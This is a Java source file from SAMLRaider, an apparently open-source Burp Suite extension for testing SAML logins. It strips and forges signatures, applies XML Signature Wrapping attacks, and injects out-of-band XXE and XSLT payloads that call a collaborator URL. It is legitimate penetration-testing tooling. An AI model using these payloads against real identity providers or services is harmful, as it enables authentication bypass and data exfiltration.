/*
 * https://github.com/CompassSecurity/SAMLRaider
 * The MIT License (MIT)
 *
 * Copyright (c) 2015 Roland Bischofberger and Emanuel Duss
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

package samlraider.application;

import burp.*;
import samlraider.gui.SamlMain;
import samlraider.gui.SamlPanelInfo;
import samlraider.gui.SignatureHelpWindow;
import samlraider.gui.XSWHelpWindow;
import samlraider.helpers.HTTPHelpers;
import samlraider.helpers.XMLHelpers;
import samlraider.helpers.XSWHelpers;
import samlraider.model.BurpCertificate;
import org.w3c.dom.*;
import org.xml.sax.SAXException;

import javax.xml.crypto.MarshalException;
import javax.xml.crypto.dsig.XMLSignatureException;
import javax.xml.parsers.ParserConfigurationException;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.spec.InvalidKeySpecException;
import java.util.HashMap;
import java.util.List;
import java.util.Observable;
import java.util.Observer;
import java.util.zip.DataFormatException;

public class SamlTabController implements IMessageEditorTab, Observer {

    private static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
    private static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
    private static final String XXE_CONTENT_APPLIED = "XXE content applied";
    private static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
    private static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
    private static final String XML_NOT_SUITABLE_FOR_XLST = "This XML Message is not suitable for this particular XLST attack";
    private static final String XML_COULD_NOT_SIGN = "Could not sign XML";
    private static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
    private static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported";
    private static final String XML_NOT_SUITABLE_FOR_XSW = "This XML Message is not suitable for this particular XSW, is there a signature?";
    private static final String NO_BROWSER = "Could not open diff in Browser. Path to file was copied to clipboard";
    private static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";

    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final XMLHelpers xmlHelpers;
    private final ITextEditor textArea;
    private final ITextEditor textEditorInformation;
    private final SamlMain samlGUI;
    private final boolean editable;
    private final CertificateTabController certificateTabController;
    private final XSWHelpers xswHelpers;
    private final HTTPHelpers httpHelpers;
    private byte[] message;
    private String orgSAMLMessage;
    private String SAMLMessage;
    private boolean isInflated = true;
    private boolean isGZip = false;
    private boolean isWSSUrlEncoded = false;
    private boolean isSOAPMessage;
    private boolean isWSSMessage;
    private boolean isSAMLRequest; // otherwise it's a SAMLResponse
    private String httpMethod; // So URI and POST Binding is supported
    private boolean isEdited = false;
    private boolean isRawMode = false;

    public SamlTabController(IBurpExtenderCallbacks callbacks, boolean editable,
                             CertificateTabController certificateTabController) {
        this.editable = editable;
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        samlGUI = new SamlMain(this);
        textArea = samlGUI.getTextEditorAction();
        textArea.setEditable(editable);
        textEditorInformation = samlGUI.getTextEditorInformation();
        textEditorInformation.setEditable(false);
        xmlHelpers = new XMLHelpers();
        xswHelpers = new XSWHelpers();
        httpHelpers = new HTTPHelpers();
        this.certificateTabController = certificateTabController;
        this.certificateTabController.addObserver(this);
    }

    public static String removeSignature_edit(String input) {
        XMLHelpers xmlHelpers = new XMLHelpers();
        String res = "";
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(input);

            int sign = xmlHelpers.removeAllSignatures(document);
            if (sign > 0) {

                res = xmlHelpers.getStringOfDocument(document, 2, true);
            } else {
                //setInfoMessageText("No Signatures available to remove");
            }

        } catch (SAXException e1) {
            e1.printStackTrace();
            //setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            e.printStackTrace();
            //setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        }
        return res;
    }

    public static String resignAssertion_edit(String input, String input_cert) {
        XMLHelpers xmlHelpers = new XMLHelpers();
        try {
            BurpCertificate original_cert = CertificateTabController.importCertificateFromString_edit(input_cert);

            BurpCertificate cert = CertificateTabController.cloneAndSignCertificate_edit(original_cert);

            if (cert != null) {
                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(input);
                NodeList assertions = xmlHelpers.getAssertions(document);
                String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
                String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));

                xmlHelpers.removeAllSignatures(document);
                String string = xmlHelpers.getString(document);
                Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
                xmlHelpers.removeEmptyTags(doc);
                xmlHelpers.signAssertion(doc, signAlgorithm, digestAlgorithm, cert.getCertificate(),
                        cert.getPrivateKey());
                return xmlHelpers.getStringOfDocument(doc, 2, true);
            }
        } catch (SAXException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String resignMessage_edit(String input, String input_cert) {
        try {
            //if (isWSSMessage) {
            //setInfoMessageText("Message signing is not possible with WS-Security messages");
            //} else {

            BurpCertificate original_cert = CertificateTabController.importCertificateFromString_edit(input_cert);

            BurpCertificate cert = CertificateTabController.cloneAndSignCertificate_edit(original_cert);

            XMLHelpers xmlHelpers = new XMLHelpers();

            if (cert != null) {
                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(input);
                NodeList responses = xmlHelpers.getResponse(document);
                String signAlgorithm = xmlHelpers.getSignatureAlgorithm(responses.item(0));
                String digestAlgorithm = xmlHelpers.getDigestAlgorithm(responses.item(0));

                xmlHelpers.removeOnlyMessageSignature(document);
                xmlHelpers.signMessage(document, signAlgorithm, digestAlgorithm, cert.getCertificate(),
                        cert.getPrivateKey());
                String res = xmlHelpers.getStringOfDocument(document, 2, true);
                return res;
            }
            //}
        } catch (IOException e) {
            //setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (SAXException e) {
            //setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (CertificateException e) {
            //setInfoMessageText(XML_COULD_NOT_SIGN);
        } catch (NoSuchAlgorithmException e) {
            //setInfoMessageText(XML_COULD_NOT_SIGN + ", no such algorithm");
        } catch (InvalidKeySpecException e) {
            //setInfoMessageText(XML_COULD_NOT_SIGN + ", invalid private key");
        } catch (MarshalException e) {
            //setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (XMLSignatureException e) {
            //setInfoMessageText(XML_COULD_NOT_SIGN);
        }
        return null;
    }

    @Override
    public byte[] getMessage() {
        byte[] byteMessage = message;
        if (isModified()) {
            if (isSOAPMessage) {
                try {
                    // TODO Only working with getString for both documents,
                    // otherwise namespaces and attributes are emptied -.-
                    IResponseInfo responseInfo = helpers.analyzeResponse(byteMessage);
                    int bodyOffset = responseInfo.getBodyOffset();
                    String HTTPHeader = new String(byteMessage, 0, bodyOffset, StandardCharsets.UTF_8);

                    String soapMessage = new String(byteMessage, bodyOffset, byteMessage.length - bodyOffset, StandardCharsets.UTF_8);
                    Document soapDocument = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
                    Element soapBody = xmlHelpers.getSOAPBody(soapDocument);
                    xmlHelpers.getString(soapDocument);
                    Document samlDocumentEdited = xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage);
                    xmlHelpers.getString(samlDocumentEdited);
                    Element samlResponse = (Element) samlDocumentEdited.getFirstChild();
                    soapDocument.adoptNode(samlResponse);
                    Element soapFirstChildOfBody = (Element) soapBody.getFirstChild();
                    soapBody.replaceChild(samlResponse, soapFirstChildOfBody);
                    String wholeMessage = HTTPHeader + xmlHelpers.getString(soapDocument);
                    byteMessage = wholeMessage.getBytes(StandardCharsets.UTF_8);
                } catch (IOException e) {
                } catch (SAXException e) {
                    setInfoMessageText(XML_NOT_WELL_FORMED);
                }
            } else {
                String textMessage = null;

                if (isRawMode) {
                    textMessage = new String(textArea.getText());
                } else {
                    try {
                        textMessage = xmlHelpers
                                .getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText())), 0, true);
                    } catch (IOException e) {
                        setInfoMessageText(XML_COULD_NOT_SERIALIZE);
                    } catch (SAXException e) {
                        setInfoMessageText(XML_NOT_WELL_FORMED);
                    }
                }

                String parameterToUpdate;
                if (isSAMLRequest) {
                    parameterToUpdate = certificateTabController.getSamlRequestParameterName();
                } else {
                    parameterToUpdate = certificateTabController.getSamlResponseParameterName();
                }

                if (isWSSMessage) {
                    parameterToUpdate = "wresult";
                }

                byte parameterType;
                if (httpMethod.equals("GET")) {
                    parameterType = IParameter.PARAM_URL;
                } else {
                    parameterType = IParameter.PARAM_BODY;
                }
                IParameter newParameter = helpers.buildParameter(parameterToUpdate, getEncodedSAMLMessage(textMessage),
                        parameterType);

                byteMessage = helpers.updateParameter(byteMessage, newParameter);
            }
        }
        return byteMessage;
    }

    @Override
    public byte[] getSelectedData() {
        return textArea.getSelectedText();
    }

    @Override
    public String getTabCaption() {
        return "SAML Raider";
    }

    @Override
    public Component getUiComponent() {
        return samlGUI;
    }

    @Override
    public boolean isEnabled(byte[] content, boolean isRequest) {
        return isRequest && isSAMLMessage(content);
    }

    private boolean isSAMLMessage(byte[] content) {
        IRequestInfo info = helpers.analyzeRequest(content);
        httpMethod = helpers.analyzeRequest(content).getMethod();
        if (info.getContentType() == IRequestInfo.CONTENT_TYPE_XML) {
            isSOAPMessage = true;
            try {
                IRequestInfo requestInfo = helpers.analyzeRequest(content);
                int bodyOffset = requestInfo.getBodyOffset();
                String soapMessage = new String(content, bodyOffset, content.length - bodyOffset, StandardCharsets.UTF_8);
                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
                return xmlHelpers.getAssertions(document).getLength() != 0
                        || xmlHelpers.getEncryptedAssertions(document).getLength() != 0;
            } catch (SAXException e) {
                e.printStackTrace();
                return false;
            }
        }
        // WSS Security
        else if (null != helpers.getRequestParameter(content, "wresult")) {
            try {
                IRequestInfo requestInfo = helpers.analyzeRequest(content);
                isWSSUrlEncoded = requestInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED;
                isWSSMessage = true;
                IParameter parameter = helpers.getRequestParameter(content, "wresult");
                String wssMessage = getDecodedSAMLMessage(parameter.getValue());
                Document document;
                document = xmlHelpers.getXMLDocumentOfSAMLMessage(wssMessage);
                return xmlHelpers.getAssertions(document).getLength() != 0
                        || xmlHelpers.getEncryptedAssertions(document).getLength() != 0;
            } catch (SAXException e) {
                e.printStackTrace();
                return false;
            }
        } else {
            isWSSMessage = false;
            isSOAPMessage = false;

            IParameter requestParameter;
            requestParameter = helpers.getRequestParameter(content, certificateTabController.getSamlResponseParameterName());
            if (requestParameter != null) {
                isSAMLRequest = false;
                return true;
            }
            requestParameter = helpers.getRequestParameter(content, certificateTabController.getSamlRequestParameterName());
            if (requestParameter != null) {
                isSAMLRequest = true;
                return true;
            }
        }
        return false;
    }

    @Override
    public boolean isModified() {
        return textArea.isTextModified() || isEdited;
    }

    @Override
    public void setMessage(byte[] content, boolean isRequest) {
        resetInfoMessageText();
        isEdited = false;
        if (content == null) {
            textArea.setText(null);
            textArea.setEditable(false);
            setGUIEditable(false);
            resetInformationDisplay();
        } else {
            message = content;
            try {
                if (isSOAPMessage) {
                    IResponseInfo responseInfo = helpers.analyzeResponse(content);
                    int bodyOffset = responseInfo.getBodyOffset();
                    String soapMessage = new String(content, bodyOffset, content.length - bodyOffset, StandardCharsets.UTF_8);
                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
                    Document documentSAML = xmlHelpers.getSAMLResponseOfSOAP(document);
                    SAMLMessage = xmlHelpers.getStringOfDocument(documentSAML, 0, false);
                } else if (isWSSMessage) {
                    IParameter parameter = helpers.getRequestParameter(content, "wresult");
                    SAMLMessage = getDecodedSAMLMessage(parameter.getValue());
                } else {
                    IParameter parameter;

                    if (isSAMLRequest) {
                        parameter = helpers.getRequestParameter(content, certificateTabController.getSamlRequestParameterName());
                    } else {
                        parameter = helpers.getRequestParameter(content, certificateTabController.getSamlResponseParameterName());
                    }

                    SAMLMessage = getDecodedSAMLMessage(parameter.getValue());
                }

            } catch (IOException e) {
                e.printStackTrace();
                setInfoMessageText(XML_COULD_NOT_SERIALIZE);
            } catch (SAXException e) {
                e.printStackTrace();
                setInfoMessageText(XML_NOT_WELL_FORMED);
                SAMLMessage = "<error>" + XML_NOT_WELL_FORMED + "</error>";
            } catch (ParserConfigurationException e) {
                e.printStackTrace();
            }

            setInformationDisplay();
            updateCertificateList();
            updateXSWList();
            orgSAMLMessage = SAMLMessage;
            textArea.setText(SAMLMessage.getBytes());
            textArea.setEditable(editable);

            setGUIEditable(editable);
        }
    }

    private void setInformationDisplay() {
        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
        infoPanel.clearAll();

        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage);
            NodeList assertions = xmlHelpers.getAssertions(document);
            if (assertions.getLength() > 0) {
                Node assertion = assertions.item(0);
                infoPanel.setIssuer(xmlHelpers.getIssuer(document));
                infoPanel.setConditionNotBefore(xmlHelpers.getConditionNotBefore(assertion));
                infoPanel.setConditionNotAfter(xmlHelpers.getConditionNotAfter(assertion));
                infoPanel.setSubjectConfNotBefore(xmlHelpers.getSubjectConfNotBefore(assertion));
                infoPanel.setSubjectConfNotAfter(xmlHelpers.getSubjectConfNotAfter(assertion));
                infoPanel.setSignatureAlgorithm(xmlHelpers.getSignatureAlgorithm(assertion));
                infoPanel.setDigestAlgorithm(xmlHelpers.getDigestAlgorithm(assertion));
                textEditorInformation.setText(xmlHelpers.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage), 2, true).getBytes());
            } else {
                assertions = xmlHelpers.getEncryptedAssertions(document);
                Node assertion = assertions.item(0);
                infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(assertion));
            }
        } catch (SAXException | IOException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        }
    }

    private void resetInformationDisplay() {
        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
        infoPanel.setIssuer("");
        infoPanel.setConditionNotBefore("");
        infoPanel.setConditionNotAfter("");
        infoPanel.setSubjectConfNotBefore("");
        infoPanel.setSubjectConfNotAfter("");
        infoPanel.setSignatureAlgorithm("");
        infoPanel.setDigestAlgorithm("");
        infoPanel.setEncryptionAlgorithm("");
        textEditorInformation.setText("".getBytes());
    }

    public String getEncodedSAMLMessage(String message) {
        byte[] byteMessage;
        if (isWSSMessage) {
            if (isWSSUrlEncoded) {
                return URLEncoder.encode(message, StandardCharsets.UTF_8);
            } else {
                return message;
            }
        }
        byteMessage = message.getBytes(StandardCharsets.UTF_8);
        if (isInflated) {
            try {
                byteMessage = httpHelpers.compress(byteMessage, isGZip);
            } catch (IOException e) {
            }
        }
        String base64Encoded = helpers.base64Encode(byteMessage);
        return URLEncoder.encode(base64Encoded, StandardCharsets.UTF_8);
    }

    public String getDecodedSAMLMessage(String message) {

        if (isWSSMessage) {
            if (isWSSUrlEncoded) {
                return helpers.urlDecode(message);
            } else {
                return message;
            }
        }

        String urlDecoded = helpers.urlDecode(message);
        byte[] base64Decoded = helpers.base64Decode(urlDecoded);

        isInflated = true;
        isGZip = true;

        // try normal Zip Inflate
        try {
            byte[] inflated = httpHelpers.decompress(base64Decoded, true);
            return new String(inflated, StandardCharsets.UTF_8);
        } catch (IOException e) {
        } catch (DataFormatException e) {
            isGZip = false;
        }

        // try Gzip Inflate
        try {
            byte[] inflated = httpHelpers.decompress(base64Decoded, false);
            return new String(inflated, StandardCharsets.UTF_8);
        } catch (IOException e) {
        } catch (DataFormatException e) {
            isInflated = false;
        }

        return new String(base64Decoded, StandardCharsets.UTF_8);
    }

    public void removeSignature() {
        resetInfoMessageText();
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
            if (xmlHelpers.removeAllSignatures(document) > 0) {
                SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
                textArea.setText(SAMLMessage.getBytes());
                isEdited = true;
                setRawMode(false);
                setInfoMessageText("Message signature successful removed");
            } else {
                setInfoMessageText("No Signatures available to remove");
            }
        } catch (SAXException e1) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        }
    }

    public void resetMessage() {
        if (isRawMode) {
            SAMLMessage = orgSAMLMessage;
        }
        textArea.setText(SAMLMessage.getBytes());
        isEdited = false;
    }

    public void setRawMode(boolean rawModeEnabled) {
        isRawMode = rawModeEnabled;
        isEdited = true;
        samlGUI.getActionPanel().setRawModeEnabled(rawModeEnabled);
    }

    public void resignAssertion() {
        try {
            resetInfoMessageText();
            BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
            if (cert != null) {
                setInfoMessageText("Signing...");
                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
                NodeList assertions = xmlHelpers.getAssertions(document);
                String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
                String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));

                xmlHelpers.removeAllSignatures(document);
                String string = xmlHelpers.getString(document);
                Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
                xmlHelpers.removeEmptyTags(doc);
                xmlHelpers.signAssertion(doc, signAlgorithm, digestAlgorithm, cert.getCertificate(),
                        cert.getPrivateKey());
                SAMLMessage = xmlHelpers.getStringOfDocument(doc, 2, true);
                textArea.setText(SAMLMessage.getBytes());
                isEdited = true;
                setRawMode(false);
                setInfoMessageText("Assertions successfully signed");
            } else {
                setInfoMessageText("no certificate chosen to sign");
            }
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (Exception e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
        }
    }

    public void resignMessage() {
        try {
            resetInfoMessageText();
            if (isWSSMessage) {
                setInfoMessageText("Message signing is not possible with WS-Security messages");
            } else {
                setInfoMessageText("Signing...");
                BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
                if (cert != null) {
                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
                    NodeList responses = xmlHelpers.getResponse(document);
                    String signAlgorithm = xmlHelpers.getSignatureAlgorithm(responses.item(0));
                    String digestAlgorithm = xmlHelpers.getDigestAlgorithm(responses.item(0));

                    xmlHelpers.removeOnlyMessageSignature(document);
                    xmlHelpers.signMessage(document, signAlgorithm, digestAlgorithm, cert.getCertificate(),
                            cert.getPrivateKey());
                    SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
                    textArea.setText(SAMLMessage.getBytes());
                    isEdited = true;
                    setRawMode(false);
                    setInfoMessageText("Message successfully signed");
                } else {
                    setInfoMessageText("no certificate chosen to sign");
                }
            }
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (CertificateException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
        } catch (NoSuchAlgorithmException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN + ", no such algorithm");
        } catch (InvalidKeySpecException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN + ", invalid private key");
        } catch (MarshalException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (XMLSignatureException e) {
            setInfoMessageText(XML_COULD_NOT_SIGN);
        }
    }

    private void setInfoMessageText(String infoMessage) {
        samlGUI.getActionPanel().getInfoMessageLabel().setText(infoMessage);
    }

    private void resetInfoMessageText() {
        samlGUI.getActionPanel().getInfoMessageLabel().setText("");
    }

    private void updateCertificateList() {
        List<BurpCertificate> list = certificateTabController.getCertificatesWithPrivateKey();
        samlGUI.getActionPanel().setCertificateList(list);
    }

    private void updateXSWList() {
        samlGUI.getActionPanel().setXSWList(XSWHelpers.xswTypes);
    }

    public void sendToCertificatesTab() {
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
            String cert = xmlHelpers.getCertificate(document.getDocumentElement());
            if (cert != null) {
                certificateTabController.importCertificateFromString(cert);
            } else {
                setInfoMessageText(XML_CERTIFICATE_NOT_FOUND);
            }
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        }
    }

    public void showXSWPreview() {
        try {
            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
            String after = xmlHelpers.getStringOfDocument(document, 2, true);
            String diff = xswHelpers.diffLineMode(orgSAMLMessage, after);

            File file = File.createTempFile("tmp", ".html", null);
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            file.deleteOnExit();
            fileOutputStream.write(diff.getBytes(StandardCharsets.UTF_8));
            fileOutputStream.flush();
            fileOutputStream.close();

            URI uri = new URL("file://" + file.getAbsolutePath()).toURI();

            Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
            if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
                desktop.browse(uri);
            } else {
                StringSelection stringSelection = new StringSelection(uri.toString());
                Clipboard clpbrd = Toolkit.getDefaultToolkit().getSystemClipboard();
                clpbrd.setContents(stringSelection, null);
                setInfoMessageText(NO_BROWSER);
            }

        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (DOMException e) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
        } catch (MalformedURLException e) {
        } catch (URISyntaxException e) {
        } catch (IOException e) {
            setInfoMessageText(NO_DIFF_TEMP_FILE);
        }
    }

    public void applyXSW() {
        Document document;
        try {
            document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
            SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
            textArea.setText(SAMLMessage.getBytes());
            isEdited = true;
            setRawMode(false);
            setInfoMessageText(XSW_ATTACK_APPLIED);
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (DOMException | NullPointerException e) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
        }
    }

    public void applyXXE(String collabUrl) {
        String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
        String[] splitMsg = orgSAMLMessage.split("\\?>");
        if (splitMsg.length == 2) {
            SAMLMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
        } else {
            String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
            SAMLMessage = xmlDeclaration + xxePayload + orgSAMLMessage;
        }
        textArea.setText(SAMLMessage.getBytes());
        isEdited = true;
        setRawMode(true);
        setInfoMessageText(XXE_CONTENT_APPLIED);
    }

    public void applyXSLT(String collabUrl) {
        String xslt = "\n" +
                "<ds:Transform>\n" +
                "  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
                "    <xsl:template match=\"doc\">\n" +
                "      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
                "      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>\n" +
                "      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
                "      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
                "      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
                "    </xsl:template>\n" +
                "  </xsl:stylesheet>\n" +
                "</ds:Transform>";
        String transformString = "<ds:Transforms>";
        int index = orgSAMLMessage.indexOf(transformString);

        if (index == -1) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XLST);
        } else {
            int substringIndex = index + transformString.length();
            String firstPart = orgSAMLMessage.substring(0, substringIndex);
            String secondPart = orgSAMLMessage.substring(substringIndex);
            SAMLMessage = firstPart + xslt + secondPart;
            textArea.setText(SAMLMessage.getBytes());
            isEdited = true;
            setRawMode(true);
            setInfoMessageText(XSLT_CONTENT_APPLIED);
        }
    }

    public synchronized void addMatchAndReplace(String match, String replace) {
        XSWHelpers.MATCH_AND_REPLACE_MAP.put(match, replace);
    }

    public synchronized HashMap<String, String> getMatchAndReplaceMap() {
        return XSWHelpers.MATCH_AND_REPLACE_MAP;
    }

    public void setGUIEditable(boolean editable) {
        if (editable) {
            samlGUI.getActionPanel().enableControls();
        } else {
            samlGUI.getActionPanel().disableControls();
        }
    }

    public void showSignatureHelp() {
        SignatureHelpWindow window = new SignatureHelpWindow();
        window.setVisible(true);
    }

    public void showXSWHelp() {
        XSWHelpWindow window = new XSWHelpWindow();
        window.setVisible(true);
    }

    @Override
    public void update(Observable arg0, Object arg1) {
        updateCertificateList();
    }

    public IBurpExtenderCallbacks getCallbacks() {
        return callbacks;
    }
}
